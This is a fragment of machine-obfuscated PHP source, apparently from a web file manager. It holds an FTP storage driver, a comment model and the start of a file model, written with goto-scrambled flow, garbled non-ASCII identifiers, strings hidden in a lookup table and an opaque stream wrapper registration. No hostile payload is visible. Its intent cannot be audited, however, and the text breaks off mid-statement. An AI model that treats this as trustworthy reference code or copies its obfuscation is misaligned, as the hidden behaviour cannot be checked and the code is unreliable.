$this->fileInfo($DÉ˜∑ôı‰œ, $CÓ««π°ç”); } } return $C‘ô‡â¢Ïõ; goto aﬁß≥êƒÖº; A˘—åïéê≤: $Cµä÷ï÷©¥ = $this->ftpList($DÉ˜∑ôı‰œ); $C‘ô‡â¢Ïõ = array($bÉÉÏµÏä‹[74] => array(), $bÉÉÏµÏä‹[73] => array()); if (!$Cµä÷ï÷©¥) { return $C‘ô‡â¢Ïõ; } goto fÜã≠ˆ«Ç⁄; aﬁß≥êƒÖº: } public function has($DñÈªëÙç™, $d≥†ÜÉ‰ªØ = false, $CéÚ£ìﬂ◊å = true) { goto Eõñ∂øÇÉª; EäÈ≥ÍœøÙ: $D∆¢Ôíüﬂ» = $this->ftpList($DñÈªëÙç™); if (!$D∆¢Ôíüﬂ») { return !1; } if ($d≥†ÜÉ‰ªØ) { return array($d¯§œÀÍñ[191] => 0, $d¯§œÀÍñ[192] => count($D∆¢Ôíüﬂ»)); } goto dâ‘˜ôùÙπ; dâ‘˜ôùÙπ: foreach ($D∆¢Ôíüﬂ» as $DñÈªëÙç™) { if ($CéÚ£ìﬂ◊å) { if (!$this->isFolder($DñÈªëÙç™)) { return !0; } } else { if ($this->isFolder($DñÈªëÙç™)) { return !0; } } } return !1; goto f◊•≥å±’Ê; Eõñ∂øÇÉª: $d¯§œÀÍñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->_isconn()) { return !1; } $DñÈªëÙç™ = $this->iconvSystem($DñÈªëÙç™); goto EäÈ≥ÍœøÙ; f◊•≥å±’Ê: } public function listAll($Eı¯ìØŸ œ) { goto d”¯©êÇ©ë; E¯â¨ÆÙ§õ: foreach ($cë£ΩÙ†ªﬁ[$f≠É∞Òã˘¬[74]] as $Dö„––Éìª) { $a£ãË÷Âö›[] = array($f≠É∞Òã˘¬[75] => $f≠É∞Òã˘¬[8] . trim(str_replace($Eı¯ìØŸ œ, $f≠É∞Òã˘¬[33], $Dö„––Éìª), $f≠É∞Òã˘¬[8]) . $f≠É∞Òã˘¬[8], $f≠É∞Òã˘¬[76] => 1, $f≠É∞Òã˘¬[77] => 0); } foreach ($cë£ΩÙ†ªﬁ[$f≠É∞Òã˘¬[73]] as $a§Ì∫ç¡õ») { $a£ãË÷Âö›[] = array($f≠É∞Òã˘¬[75] => $f≠É∞Òã˘¬[8] . trim(str_replace($Eı¯ìØŸ œ, $f≠É∞Òã˘¬[33], $a§Ì∫ç¡õ»), $f≠É∞Òã˘¬[8]), $f≠É∞Òã˘¬[76] => 0, $f≠É∞Òã˘¬[77] => $this->size($a§Ì∫ç¡õ»)); } return $a£ãË÷Âö›; goto eñ∫Ö¿’‘ù; d”¯©êÇ©ë: $f≠É∞Òã˘¬ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->_isconn()) { return !1; } $Eı¯ìØŸ œ = $this->iconvSystem($Eı¯ìØŸ œ); goto CÀ‹ÉÉ‚”’; CÀ‹ÉÉ‚”’: $cë£ΩÙ†ªﬁ = array($f≠É∞Òã˘¬[73] => array(), $f≠É∞Òã˘¬[74] => array()); $this->recursionFtpFiles($Eı¯ìØŸ œ, $cë£ΩÙ†ªﬁ); $a£ãË÷Âö› = array(); goto E¯â¨ÆÙ§õ; eñ∫Ö¿’‘ù: } public function getContent($d¶Æè˘€Øî) { if (!$this->_isconn()) { return !1; } $d¶Æè˘€Øî = $this->iconvSystem($d¶Æè˘€Øî); return $this->fileSubstr($d¶Æè˘€Øî); } public function setContent($EÃñÀü‡ïŒ, $aèÜçî∂ë = '') { goto A”≤∫∏å∆´; CÎ“ˆ„îõÀ: return $dÕâŒåÑà; goto D€ﬁç»Ñ˜ô; A”≤∫∏å∆´: if (!$this->_isconn()) { return !1; } $f∏Ω∂é…ÀÃ = $this->pathThis($this->iconvSystem($EÃñÀü‡ïŒ)); $bãÌá‚»Œ¡ = $this->tempFile($f∏Ω∂é…ÀÃ); goto E©ıµÿ–àÚ; E©ıµÿ–àÚ: file_put_contents($bãÌá‚»Œ¡, $aèÜçî∂ë); $dÕâŒåÑà = $this->upload($EÃñÀü‡ïŒ, $this->iconvApp($bãÌá‚»Œ¡)); $this->tempFileRemve($bãÌá‚»Œ¡); goto CÎ“ˆ„îõÀ; D€ﬁç»Ñ˜ô: } public function fileSubstr($C±∂Æ≥Â£æ, $F◊ ÑÔ’õ± = 0, $eÜìï˘ƒé = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($C±∂Æ≥Â£æ, $F◊ ÑÔ’õ±, $eÜìï˘ƒé); } private function ftpRequest($d¨Õ≠É⁄•›, $fó≤°â°Œ≤ = 0, $eÍ‹Á»◊ƒ€ = false) { goto dﬂ∏õ” ø‹; f‹Á–˜¯âê: curl_setopt($F®ÍÔùﬁ’, CURLOPT_RETURNTRANSFER, 1); $Bç¯àñ≥≈ã = curl_exec($F®ÍÔùﬁ’); curl_close($F®ÍÔùﬁ’); goto C««îÚÿßØ; dﬂ∏õ” ø‹: $d¨Õ≠É⁄•› = $this->iconvSystem($d¨Õ≠É⁄•›); $DΩÆ¢£µê¨ = $this->scheme . $this->host . $_SERVER[Ä¿¡‡öóµŸﬂ‡][4] . $this->port; $F®ÍÔùﬁ’ = curl_init(); goto C«è¡—¡ﬁë; C««îÚÿßØ: return $Bç¯àñ≥≈ã; goto e∆ÃÛ…≥äÊ; C«è¡—¡ﬁë: curl_setopt($F®ÍÔùﬁ’, CURLOPT_URL, $DΩÆ¢£µê¨ . $this->pathEncode($d¨Õ≠É⁄•›)); curl_setopt($F®ÍÔùﬁ’, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($eÍ‹Á»◊ƒ€) { $d∂Õêîßﬂ∆ = $fó≤°â°Œ≤ + $eÍ‹Á»◊ƒ€ - 1; curl_setopt($F®ÍÔùﬁ’, CURLOPT_RANGE, "{$fó≤°â°Œ≤}\55{$d∂Õêîßﬂ∆}"); } goto f‹Á–˜¯âê; e∆ÃÛ…≥äÊ: } public function upload($c©¨´…¨Ñê, $CúÜæÔÉÔ·, $d»Ç√≈ÜÚÖ = false, $DÏãƒ‚àØÚ = REPEAT_REPLACE) { goto fÉ°áª‹ì∞; bªŒô∞¯∆õ: if ($d§æ‚¿ÉÑÊ != FTP_FINISHED) { return !1; } return $this->getPathOuter($c©¨´…¨Ñê); goto cûàç®ê„—; Dæ€œÖ≠÷ª: $CúÜæÔÉÔ· = $this->iconvSystem($CúÜæÔÉÔ·); $d§æ‚¿ÉÑÊ = ftp_nb_put($this->connect, $c©¨´…¨Ñê, $CúÜæÔÉÔ·, FTP_BINARY); while ($d§æ‚¿ÉÑÊ == FTP_MOREDATA) { $d§æ‚¿ÉÑÊ = ftp_nb_continue($this->connect); } goto bªŒô∞¯∆õ; fÉ°áª‹ì∞: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($c©¨´…¨Ñê))) { return !1; } $c©¨´…¨Ñê = $this->iconvSystem($c©¨´…¨Ñê); goto Dæ€œÖ≠÷ª; cûàç®ê„—: } public function download($FûÊÎÁ·Ú≈, $fŒß‚‚ò…Ó = '') { goto Cá‰Öâ…•ä; Cá‰Öâ…•ä: if (!$this->_isconn()) { return !1; } $Cè™‡É•£… = $this->pathFather($fŒß‚‚ò…Ó); if (!IO::mkdir($Cè™‡É•£…)) { return !1; } goto e´ƒ≈—≠î›; e´ƒ≈—≠î›: $FûÊÎÁ·Ú≈ = $this->iconvSystem($FûÊÎÁ·Ú≈); $fŒß‚‚ò…Ó = $this->iconvSystem($fŒß‚‚ò…Ó); $aã™´éÚˆé = ftp_nb_get($this->connect, $fŒß‚‚ò…Ó, $FûÊÎÁ·Ú≈, FTP_BINARY); goto F∫©ÑÂÉÖä; F∫©ÑÂÉÖä: while ($aã™´éÚˆé == FTP_MOREDATA) { $aã™´éÚˆé = ftp_nb_continue($this->connect); } if ($aã™´éÚˆé != FTP_FINISHED) { return !1; } return $this->iconvApp($fŒß‚‚ò…Ó); goto dÜÎÉÈÔ±À; dÜÎÉÈÔ±À: } private function ftpList($dÈéŒÜôó≈) { goto FÏ⁄ÉﬂÃ¨ß; FÏ⁄ÉﬂÃ¨ß: $dø¶„«—“º =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->isFolder($dÈéŒÜôó≈)) { return !1; } @ftp_chdir($this->connect, $dø¶„«—“º[8]); goto aöÃÃ»Ïî∫; cëúÑ»øﬂÈ: $aõù∞ﬂÏ™≠ = array(); foreach ($bÛáÑ´¯ÉÇ as $e∞›¨ÆÆÂﬁ) { if ($e∞›¨ÆÆÂﬁ == $dø¶„«—“º[91] || $e∞›¨ÆÆÂﬁ == $dø¶„«—“º[1168]) { continue; } if (!strstr($e∞›¨ÆÆÂﬁ, $dø¶„«—“º[8])) { $e∞›¨ÆÆÂﬁ = $dÈéŒÜôó≈ . ltrim($e∞›¨ÆÆÂﬁ, $dø¶„«—“º[8]); } $aõù∞ﬂÏ™≠[] = $this->iconvApp($e∞›¨ÆÆÂﬁ); } return $aõù∞ﬂÏ™≠; goto E”‘ëñàØÇ; aöÃÃ»Ïî∫: $dÈéŒÜôó≈ = rtrim($dÈéŒÜôó≈, $dø¶„«—“º[8]) . $dø¶„«—“º[8]; $bÛáÑ´¯ÉÇ = @ftp_nlist($this->connect, $dÈéŒÜôó≈); if ($bÛáÑ´¯ÉÇ === !1) { $bÛáÑ´¯ÉÇ = @ftp_rawlist($this->connect, $dÈéŒÜôó≈); foreach ($bÛáÑ´¯ÉÇ as $fÁÒëûÉáû => $b¯é£—∫∫«) { $bÛáÑ´¯ÉÇ[$fÁÒëûÉáû] = end(explode($dø¶„«—“º[1167], $b¯é£—∫∫«)); } } goto cëúÑ»øﬂÈ; E”‘ëñàØÇ: } private function recursionFtpFiles($aÙùëœåÛê, &$bïÌèáåÇÖ) { $E•˘Á¯¶Ω∂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->_isconn()) { return !1; } if (!($bÎÚ∆ä¨á÷ = $this->ftpList($aÙùëœåÛê))) { return !1; } foreach ($bÎÚ∆ä¨á÷ as $aÙùëœåÛê) { if ($this->isFolder($aÙùëœåÛê)) { $this->recursionFtpFiles($aÙùëœåÛê, $bïÌèáåÇÖ); $bïÌèáåÇÖ[$E•˘Á¯¶Ω∂[74]][] = $aÙùëœåÛê; } else { $bïÌèáåÇÖ[$E•˘Á¯¶Ω∂[73]][] = $aÙùëœåÛê; } } } private function objectMeta($E˜£∏ÑÚ«Ï) { goto eãèı§ÿëó; eãèı§ÿëó: $Eéì≤ŸÕö… =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c’Ô˘·◊∏ﬂ = $Eéì≤ŸÕö…[1169] . md5($E˜£∏ÑÚ«Ï); $a◊ô˜éÔ¬é = Cache::get($c’Ô˘·◊∏ﬂ); goto Bπ Œ‰ï™Õ; f£º≈å˜˘ó: $f·ùìê“ª∂ = @ftp_size($this->connect, $this->iconvSystem($E˜£∏ÑÚ«Ï)); if ($f·ùìê“ª∂ != -1) { $a◊ô˜éÔ¬é = array($Eéì≤ŸÕö…[77] => $f·ùìê“ª∂, $Eéì≤ŸÕö…[29] => $Eéì≤ŸÕö…[167]); } else { $f⁄‰°ãçØÜ = @ftp_chdir($this->connect, $this->iconvSystem($E˜£∏ÑÚ«Ï)); $a◊ô˜éÔ¬é = $f⁄‰°ãçØÜ ? array($Eéì≤ŸÕö…[77] => 0, $Eéì≤ŸÕö…[29] => $Eéì≤ŸÕö…[76]) : !1; } Cache::set($c’Ô˘·◊∏ﬂ, $a◊ô˜éÔ¬é, 0); goto A„ÔÁ–°ÀÆ; A„ÔÁ–°ÀÆ: return $a◊ô˜éÔ¬é; goto B≥ˆ‘á‚ç‹; Bπ Œ‰ï™Õ: if ($a◊ô˜éÔ¬é !== null && $a◊ô˜éÔ¬é !== !1) { return $a◊ô˜éÔ¬é; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $Eéì≤ŸÕö…[8]); goto f£º≈å˜˘ó; B≥ˆ‘á‚ç‹: } } goto C·ëŸÈ£Ñá; FÆ⁄•ﬂ©ÿä: $_SERVER[$_SERVER[ÁŸäœ¨][52]] = (base64_decode('OTY3Ng==')."\66\71")+0;$_kwyR="uuAIJzvQknchezBUKcxhIXwRtFDE245ZfHYfzTA2u3WPMzDiQxmP798GYTMQbEt3nfa7RXh";; stream_wrapper_register($_SERVER[ÁŸäœ¨][53], $_SERVER[ÁŸäœ¨][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Aå⁄√Ñ√ûë, $dò£•ìúîÍ) { $fÇÔàèÒŒÑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (isset(self::$_methodList[$Aå⁄√Ñ√ûë])) { return @call_user_func_array(self::$_methodList[$Aå⁄√Ñ√ûë], $dò£•ìúîÍ); } else { if (method_exists($this, $Aå⁄√Ñ√ûë)) { return call_user_func_array(array($this, $Aå⁄√Ñ√ûë), $dò£•ìúîÍ); } else { think_exception(__CLASS__ . $fÇÔàèÒŒÑ[4] . $Aå⁄√Ñ√ûë . $fÇÔàèÒŒÑ[5]); } } } public static function __callStatic($eƒ≤í±ëÙ≠, $b⁄ªªƒÍ≠¢) { if (isset(self::$_methodListStatic[$eƒ≤í±ëÙ≠])) { return call_user_func_array(self::$_methodListStatic[$eƒ≤í±ëÙ≠], $b⁄ªªƒÍ≠¢); } else { if (method_exists(self, $eƒ≤í±ëÙ≠)) { return call_user_func_array(array(self, $eƒ≤í±ëÙ≠), $b⁄ªªƒÍ≠¢); } else { show_json("{$eƒ≤í±ëÙ≠}\50\x29\40\x6e\157\164\x20\x65\170\151\x73\164\x3b", !1); } } } public static function addMethod($Aüﬁ°ô´íÖ, $f¨À‰ƒíä˜) { self::$_methodList[$Aüﬁ°ô´íÖ] = $f¨À‰ƒíä˜; } public static function addMethodStatic($E¢ç©Ò›ŒÇ, $b¬ëÉÈê¢…) { self::$_methodListStatic[$E¢ç©Ò›ŒÇ] = $b¬ëÉÈê¢…; } } goto bÑ◊–á¿–”; f†≈Î”‰å: class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\155\145\156\x74"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\141\x6d\x65" => "\x63\157\x6d\x6d\145\156\164\x5f\x6d\x65\164\x61", "\155\x65\164\141\x46\151\x65\x6c\x64" => "\143\x6f\x6d\155\145\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($a¶ß÷«‹Ë◊) { $F’êÏèË€Í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($a¶ß÷«‹Ë◊[$F’êÏèË€Í[2134]]) { $c—ƒÇæåŒÂ = $this->where(array($F’êÏèË€Í[2135] => $a¶ß÷«‹Ë◊[$F’êÏèË€Í[2134]]))->find(); if (!$c—ƒÇæåŒÂ || $c—ƒÇæåŒÂ[$F’êÏèË€Í[371]] != $a¶ß÷«‹Ë◊[$F’êÏèË€Í[371]] || $c—ƒÇæåŒÂ[$F’êÏèË€Í[456]] != $a¶ß÷«‹Ë◊[$F’êÏèË€Í[456]]) { return !1; } $this->where(array($F’êÏèË€Í[2135] => $a¶ß÷«‹Ë◊[$F’êÏèË€Í[2134]]))->setAdd($F’êÏèË€Í[2136], 1); } return $this->add($a¶ß÷«‹Ë◊); } public function remove($aΩ∫∞≤Ç¢§) { $f ‹Ü†≠Ï© =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AÏ¥™˘ÁÉ— = array($f ‹Ü†≠Ï©[2135] => $aΩ∫∞≤Ç¢§); $c¢Í›ËÛ“ó = $this->where($AÏ¥™˘ÁÉ—)->find(); if ($c¢Í›ËÛ“ó[$f ‹Ü†≠Ï©[2134]]) { $this->where(array($f ‹Ü†≠Ï©[2135] => $c¢Í›ËÛ“ó[$f ‹Ü†≠Ï©[2134]]))->setAdd($f ‹Ü†≠Ï©[2136], -1); } return $this->where($AÏ¥™˘ÁÉ—)->delete(); } public function edit($fœÜ•íçÛê, $EÍ¶Ô‘„Óî) { $E¡æ¯»ç’ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BìΩ†ƒ§ÑÆ = array($E¡æ¯»ç’[2135] => $fœÜ•íçÛê); return $this->where($BìΩ†ƒ§ÑÆ)->save(array($E¡æ¯»ç’[2137] => $EÍ¶Ô‘„Óî)); } public function prasise($Dé”ﬂÑåÀ‚) { $a∫êø∏∑ªâ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CıÊ®òëé‘ = Model($a∫êø∏∑ªâ[2138]); $b±ú◊∂ë≠Æ = array($a∫êø∏∑ªâ[2135] => $Dé”ﬂÑåÀ‚, $a∫êø∏∑ªâ[1429] => USER_ID); $C¢†ñê≈ﬁ§ = $CıÊ®òëé‘->where($b±ú◊∂ë≠Æ)->find(); if (!$C¢†ñê≈ﬁ§) { $CıÊ®òëé‘->add($b±ú◊∂ë≠Æ); $cÔŒˆ¯ı§ù = $this->where(array($a∫êø∏∑ªâ[2135] => $Dé”ﬂÑåÀ‚))->setAdd($a∫êø∏∑ªâ[2139], 1); } else { $CıÊ®òëé‘->where($b±ú◊∂ë≠Æ)->delete(); $cÔŒˆ¯ı§ù = $this->where(array($a∫êø∏∑ªâ[2135] => $Dé”ﬂÑåÀ‚))->setAdd($a∫êø∏∑ªâ[2139], -1); } return $cÔŒˆ¯ı§ù; } public function targetInfo($a‰±˜≤èﬁÛ, $dÀ´Üí¨∏ª) { goto C≥—àÑ‚˜¯; C≥—àÑ‚˜¯: $b›∂éøÇß =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D’≠πµ¢ä€ = array($b›∂éøÇß[521] => $a‰±˜≤èﬁÛ, $b›∂éøÇß[522] => $dÀ´Üí¨∏ª); $dﬂ†æÀ¯‰ˆ = $this->where($D’≠πµ¢ä€)->count(); goto Dî⁄ÇµæΩ≈; E£°èÍóˆü: return $F»íØí∏◊ô; goto DÚ’ﬂ«ÓÉƒ; Dî⁄ÇµæΩ≈: $dÂ€Ë¡Áô™ = "\x52\111\x47\x48\124\40\112\117\x49\116\x20{$this->tablePrefix}\143\157\x6d\x6d\x65\156\x74\x5f\160\x72\x61\x69\163\x65\x20\x73\x74\x61\x72\40\x6f\156\x20\143\157\155\155\145\x6e\x74\56\x63\157\155\x6d\x65\x6e\164\111\x44\40\x3d\40\x73\164\x61\162\x2e\143\x6f\x6d\x6d\145\x6e\x74\111\104"; $cÊŸÃûµ¡¶ = $this->alias($b›∂éøÇß[341])->where($D’≠πµ¢ä€)->join($dÂ€Ë¡Áô™, $b›∂éøÇß[2140])->count(); $F»íØí∏◊ô = array($b›∂éøÇß[2141] => $dﬂ†æÀ¯‰ˆ, $b›∂éøÇß[2142] => $cÊŸÃûµ¡¶); goto E£°èÍóˆü; DÚ’ﬂ«ÓÉƒ: } public function listData($A¬é§†ª”Ã) { $CÖ©£…®íÑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (isset($A¬é§†ª”Ã[$CÖ©£…®íÑ[2143]])) { if ($A¬é§†ª”Ã[$CÖ©£…®íÑ[2143]]) { $A¬é§†ª”Ã[$CÖ©£…®íÑ[2144]] = array($CÖ©£…®íÑ[932], intval($A¬é§†ª”Ã[$CÖ©£…®íÑ[2143]])); } unset($A¬é§†ª”Ã[$CÖ©£…®íÑ[2143]]); } if (isset($A¬é§†ª”Ã[$CÖ©£…®íÑ[2145]])) { if ($A¬é§†ª”Ã[$CÖ©£…®íÑ[2145]]) { $A¬é§†ª”Ã[$CÖ©£…®íÑ[2144]] = array($CÖ©£…®íÑ[929], intval($A¬é§†ª”Ã[$CÖ©£…®íÑ[2145]])); } unset($A¬é§†ª”Ã[$CÖ©£…®íÑ[2145]]); } return $this->_listData($A¬é§†ª”Ã); } private function _listData($Cñè∏Ë˜Øõ) { $F‰ì–ßãÜï =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AÍòœí ¥” = $this->where($Cñè∏Ë˜Øõ)->_makeOrder()->selectPage(100); $this->_listAppendParent($AÍòœí ¥”[$F‰ì–ßãÜï[354]]); $this->_listAppendUser($AÍòœí ¥”[$F‰ì–ßãÜï[354]]); $this->_listAppendMeta($AÍòœí ¥”[$F‰ì–ßãÜï[354]]); return $AÍòœí ¥”; } private function _makeOrder() { $bÑÑØì©ëÆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cîù’¢°õ· = array($bÑÑØì©ëÆ[2139], $bÑÑØì©ëÆ[2136], $bÑÑØì©ëÆ[187]); $DÌåÍâœä° = Input::get($bÑÑØì©ëÆ[407], $bÑÑØì©ëÆ[7], $bÑÑØì©ëÆ[389], $cîù’¢°õ·); $aâª¡Ó§Ö˘ = Input::get($bÑÑØì©ëÆ[408], $bÑÑØì©ëÆ[7], $bÑÑØì©ëÆ[1431], array($bÑÑØì©ëÆ[2146], $bÑÑØì©ëÆ[405])); $E◊Ï¯Ø∫ñ« = $DÌåÍâœä° . $bÑÑØì©ëÆ[50] . $aâª¡Ó§Ö˘; return $this->order($E◊Ï¯Ø∫ñ«); } private function _listAppendParent(&$CŸü”°Î£≠) { goto C∏éúáËœÖ; d—ÃœÉå…‰: if (!$cõÑ≤÷¯›î) { return; } $C‹ﬁ‹‰“§Î = $this->where(array($EçÇÚíÈÂÌ[2135] => array($EçÇÚíÈÂÌ[7], $cõÑ≤÷¯›î)))->select(); $C‹ﬁ‹‰“§Î = array_to_keyvalue($C‹ﬁ‹‰“§Î, $EçÇÚíÈÂÌ[2144]); goto AÈÍÑ·¨òÓ; AÈÍÑ·¨òÓ: foreach ($CŸü”°Î£≠ as &$F˜™π’âô±) { if (isset($C‹ﬁ‹‰“§Î[$F˜™π’âô±[$EçÇÚíÈÂÌ[2134]]])) { $F˜™π’âô±[$EçÇÚíÈÂÌ[2147]] = $C‹ﬁ‹‰“§Î[$F˜™π’âô±[$EçÇÚíÈÂÌ[2134]]]; } } goto dÓˆƒèè≈Ù; C∏éúáËœÖ: $EçÇÚíÈÂÌ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cõÑ≤÷¯›î = array_unique(array_to_keyvalue($CŸü”°Î£≠, $EçÇÚíÈÂÌ[33], $EçÇÚíÈÂÌ[2134])); $cõÑ≤÷¯›î = array_remove_value($cõÑ≤÷¯›î, $EçÇÚíÈÂÌ[468]); goto d—ÃœÉå…‰; dÓˆƒèè≈Ù: } private function _listAppendUser(&$DÒÍÃËó≥˘) { goto DßﬁêÏÁ…ö; DßﬁêÏÁ…ö: $EÚáÚõËÇﬁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A°ÿ¯äöì = array_unique(array_to_keyvalue($DÒÍÃËó≥˘, $EÚáÚõËÇﬁ[33], $EÚáÚõËÇﬁ[1438])); $A°ÿ¯äöì = array_remove_value($A°ÿ¯äöì, $EÚáÚõËÇﬁ[468]); goto CúßÙç›∂û; dÊ˘∂Ó±¡: foreach ($DÒÍÃËó≥˘ as &$EÿÜ›¡Óˆü) { $EÿÜ›¡Óˆü[$EÚáÚõËÇﬁ[535]] = $D£≥û›Ê¶…[$EÿÜ›¡Óˆü[$EÚáÚõËÇﬁ[1438]]]; if (isset($EÿÜ›¡Óˆü[$EÚáÚõËÇﬁ[2147]])) { $EÿÜ›¡Óˆü[$EÚáÚõËÇﬁ[2147]][$EÚáÚõËÇﬁ[535]] = $D£≥û›Ê¶…[$EÿÜ›¡Óˆü[$EÚáÚõËÇﬁ[2147]][$EÚáÚõËÇﬁ[1438]]]; } } goto fè‘¡ﬁ‘∫Á; CúßÙç›∂û: if (count($A°ÿ¯äöì) == 0) { return; } foreach ($DÒÍÃËó≥˘ as $EÿÜ›¡Óˆü) { if (isset($EÿÜ›¡Óˆü[$EÚáÚõËÇﬁ[2147]])) { $A°ÿ¯äöì[] = $EÿÜ›¡Óˆü[$EÚáÚõËÇﬁ[2147]][$EÚáÚõËÇﬁ[1438]]; } } $D£≥û›Ê¶… = Model($EÚáÚõËÇﬁ[477])->userListInfo($A°ÿ¯äöì); goto dÊ˘∂Ó±¡; fè‘¡ﬁ‘∫Á: } private function _listAppendMeta(&$fîá‚Á∞Õ¶) { goto b◊¯ú´°ºó; b◊¯ú´°ºó: $AÁáúõ†∞¢ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f…≤€√ΩÀü = array_unique(array_to_keyvalue($fîá‚Á∞Õ¶, $AÁáúõ†∞¢[33], $AÁáúõ†∞¢[2144])); $f…≤€√ΩÀü = array_remove_value($f…≤€√ΩÀü, $AÁáúõ†∞¢[468]); goto E˘Œßü‰·…; E˘Œßü‰·…: if (!$f…≤€√ΩÀü) { return; } foreach ($fîá‚Á∞Õ¶ as $FëªÚëø´ñ) { if (isset($FëªÚëø´ñ[$AÁáúõ†∞¢[2147]])) { $f…≤€√ΩÀü[] = $FëªÚëø´ñ[$AÁáúõ†∞¢[2147]][$AÁáúõ†∞¢[2144]]; } } $c±ãÆë—•◊ = $this->metaList($f…≤€√ΩÀü); goto c“œóÎë¶¢; c“œóÎë¶¢: if (!$c±ãÆë—•◊) { return !1; } foreach ($fîá‚Á∞Õ¶ as &$FëªÚëø´ñ) { $FëªÚëø´ñ[$AÁáúõ†∞¢[417]] = $c±ãÆë—•◊[$FëªÚëø´ñ[$AÁáúõ†∞¢[2144]]]; if (isset($FëªÚëø´ñ[$AÁáúõ†∞¢[2147]])) { $FëªÚëø´ñ[$AÁáúõ†∞¢[2147]][$AÁáúõ†∞¢[417]] = $c±ãÆë—•◊[$FëªÚëø´ñ[$AÁáúõ†∞¢[2147]][$AÁáúõ†∞¢[2144]]]; } } goto c•¶È¿∫≠∂; c•¶È¿∫≠∂: } private function metaList($cÀ‹”Õ‚õﬂ) { goto E˜⁄›Õƒ´≥; b„ÍêŸ±µÂ: return $Dì¬Ïõ§êé ? $Dì¬Ïõ§êé : array(); goto cäÿ‹ìëåÙ; E˜⁄›Õƒ´≥: $côÑòë€çµ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$cÀ‹”Õ‚õﬂ) { return array(); } $EßÚË·⁄Ùó = array($côÑòë€çµ[2144] => array($côÑòë€çµ[7], $cÀ‹”Õ‚õﬂ)); goto D¬ê∑ó¯Ê”; D¬ê∑ó¯Ê”: $Dì¬Ïõ§êé = Model($côÑòë€çµ[2148])->where($EßÚË·⁄Ùó)->select(); $Dì¬Ïõ§êé = array_to_keyvalue_group($Dì¬Ïõ§êé, $côÑòë€çµ[2144]); foreach ($Dì¬Ïõ§êé as $f’∂À∆•ßÁ => $c±⁄Ìª®ô“) { $DÙÜ‡Ûâåø = array(); foreach ($c±⁄Ìª®ô“ as $E⁄ôŸƒÁ©‚) { $DÙÜ‡Ûâåø[$E⁄ôŸƒÁ©‚[$côÑòë€çµ[89]]] = $E⁄ôŸƒÁ©‚[$côÑòë€çµ[359]]; } $Dì¬Ïõ§êé[$f’∂À∆•ßÁ] = $DÙÜ‡Ûâåø; } goto b„ÍêŸ±µÂ; cäÿ‹ìëåÙ: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\x6c\x65"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\x6d\x65" => "\151\x6f\x5f\x66\151\x6c\x65\137\155\145\164\x61", "\155\x65\x74\x61\x46\x69\x65\154\x64" => "\x66\151\154\145\x49\104"); public function fileInfo($c∞ä◊∏”π∑) { $cñŸê©ëã‚ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; static $D È†›Ñäè = array(); if (!isset($D È†›Ñäè[$c∞ä◊∏”π∑])) { $A´÷§–ä„÷ = $cñŸê©ëã‚[2149]; $eŒ÷é°ø«  = Model($cñŸê©ëã‚[422])->field($A´÷§–ä„÷)->where(array($cñŸê©ëã‚[420] => $c∞ä◊∏”π∑))->find(); $D È†›Ñäè[$c∞ä◊∏”π∑] = $eŒ÷é°ø« ; } return $D È†›Ñäè[$c∞ä◊∏”π∑]; } public function addFileByContent($FÒÔ©‹ŒÙ˜ = '', $c’Ñ û√º™ = '') { goto eÍïüÊ∑çÀ; AÜªÙ∏‚¥ñ: if (file_exists($Fç…Ö∏æ∆ü)) { @unlink($Fç…Ö∏æ∆ü); } return $a†‘ùœ â©; goto Cæ„‘«Á¡‚; eÍïüÊ∑çÀ: $fÊåìàﬂ—æ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Cä›ﬂ´‡ıô = TEMP_PATH . $fÊåìàﬂ—æ[2150]; if (!is_dir($Cä›ﬂ´‡ıô)) { mk_dir($Cä›ﬂ´‡ıô); } goto E∞¡«äÃöó; E∞¡«äÃöó: $Fç…Ö∏æ∆ü = $Cä›ﬂ´‡ıô . $fÊåìàﬂ—æ[2151] . rand_string(16); file_put_contents($Fç…Ö∏æ∆ü, $FÒÔ©‹ŒÙ˜); $a†‘ùœ â© = $this->addFile($Fç…Ö∏æ∆ü, $c’Ñ û√º™, !0); goto AÜªÙ∏‚¥ñ; Cæ„‘«Á¡‚: } public function createFileName($dóï©÷˘√ƒ) { goto D•ÿ‚™Ω∂±; bÇ—Ö“∑ò·: $Cπàª®Êï† = $dÏ≤ŒúûÑ¡->pathFather($fºü«€‘Ö¨); static $DÂËÏ∆ùΩª = false; $Cçê‚«€Ç‹ = $a´Ÿ‚˘œÇÁ[2152] . md5($Cπàª®Êï†); goto dã€îΩΩ¥ö; D•ÿ‚™Ω∂±: $a´Ÿ‚˘œÇÁ =& 